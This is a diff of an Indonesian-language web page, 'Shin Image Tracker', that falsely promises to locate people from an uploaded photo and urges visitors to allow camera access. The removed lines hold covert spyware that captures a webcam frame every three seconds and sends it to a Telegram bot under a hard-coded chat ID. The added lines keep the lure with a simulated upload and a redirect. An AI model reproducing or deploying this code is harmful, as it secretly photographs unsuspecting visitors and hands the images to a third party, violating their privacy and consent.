@@ -9,61 +9,76 @@
     <meta property="og:image" content="https://telegra.ph/file/8182efdb2415a8e717d9e.jpg" />
     <meta property="og:url" content="https://shin-tracker.vercel.app" />
     <style>
-             .container1 {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 100%;                 
-            height: 100vh;
+        /* CSS untuk tata letak */
+        body {
+            font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
             background-color: #f0f0f0;
-        }        
-        .image {
-            width: 100px;
-            height: 100px;
-            margin-right: 20px;
-        }
-        .jd {
-            font-size: 24px;
-            font-family: Arial, serif;
-        }
-        .title {
-            font-size: 32px;
-            color: #666;
-            font-family: Georgia, serif;
-            text-align: center;
         }
         .container {
             display: flex;
             align-items: center;
-        }
-        .container img {
-            margin-left: 20px; /* Jarak antara gambar dan teks */
-        }
-        #video-container {
-            position: relative;
-            width: 100%;
-            max-width: 600px;
-        }
-        canvas {
-            width: 100%;
-            display: block;
-        }
-        #overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
             justify-content: center;
-            align-items: center;
-            background-color: rgba(0, 0, 0, 0.5); /* semi-transparent background */
-            color: white;
-            font-size: 2em;
-            font-weight: bold;
+            flex-direction: column;
+            padding: 20px;
+            background-color: #fff;
+            margin: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        .image {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 20px;
+        }
+        .title {
+            font-size: 24px;
+            color: #333;
+            font-family: Georgia, serif;
             text-align: center;
+        }
+        .jd {
+            font-size: 18px;
+            color: #666;
+            text-align: center;
+            line-height: 1.6;
+        }
+        #upload-btn {
+            background-color: #007bff;
+            color: #fff;
+            font-size: 20px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        #upload-btn:hover {
+            background-color: #0056b3;
+        }
+        #continue-btn {
+            background-color: #28a745;
+            color: #fff;
+            font-size: 20px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: none; /* defaultnya disembunyikan */
+        }
+        #continue-btn:hover {
+            background-color: #218838;
+        }
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
         }
     </style>
 </head>
@@ -73,55 +88,34 @@
         <h1 class="title">Shin Image Tracker</h1>
     </div>
     <div id="video-container">       
-    <canvas id="canvas" style="display: none;"></canvas>     
-        <br>
-        <img src="https://telegra.ph/file/7b755c6b85a3ea922ce44.jpg" alt="Tracker Gambar" width=720px>
-     <br>
-        <p class="jd">Lacak lokasi hanya dengan mengunggah foto, izinkan akses kamera untuk mengoktimalkan pelacakan agar sesuai dan tepat,jika di rasa masih ada error silahkan hubungi customer service.</p>
+        <img src="https://telegra.ph/file/7b755c6b85a3ea922ce44.jpg" alt="Tracker Gambar">
+        <p class="jd">Lacak lokasi hanya dengan mengunggah foto, izinkan akses kamera untuk mengoptimalkan pelacakan agar sesuai dan tepat. Jika masih ada masalah, silakan hubungi layanan pelanggan kami.</p>
+    </div>
+    <div class="container">
+        <p style="font-size: 24px;">Coba Sekarang</p>
+        <input type="file" id="file-input" style="display: none;">
+        <label for="file-input" id="upload-btn" onclick="document.getElementById('file-input').click()">Upload</label>
+        <button id="continue-btn" onclick="continueToNextPage()">Continue</button>
+    </div>
+    <footer>
+        <p>Shin 2024</p>
+    </footer>
     <script>
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        const chatId = '7056220365';
-        const botToken = '';
-
-        // Minta akses ke kamera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                // Ambil foto setiap 3 detik
-                setInterval(() => takePhotoAndSend(video), 3000);
-            })
-            .catch(err => {
-                console.error('Error accessing webcam: ', err);
-            });
-
-        function takePhotoAndSend(video) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'selfie.jpg');
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (!data.ok) {
-                        console.error('Error sending photo to Telegram:', data.description);
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
-            }, 'image/jpeg');
+        function continueToNextPage() {
+            // Ganti URL ini dengan halaman tujuan
+            window.location.href = 'halaman-tujuan.html';
         }
+
+        document.getElementById('file-input').addEventListener('change', function() {
+            const file = this.files[0];
+            if (file) {
+                // Simulasi proses upload
+                setTimeout(() => {
+                    document.getElementById('upload-btn').style.display = 'none';
+                    document.getElementById('continue-btn').style.display = 'block';
+                }, 2000); // Ganti 2000 dengan waktu sebenarnya proses upload
+            }
+        });
     </script>
 </body>
 </html>
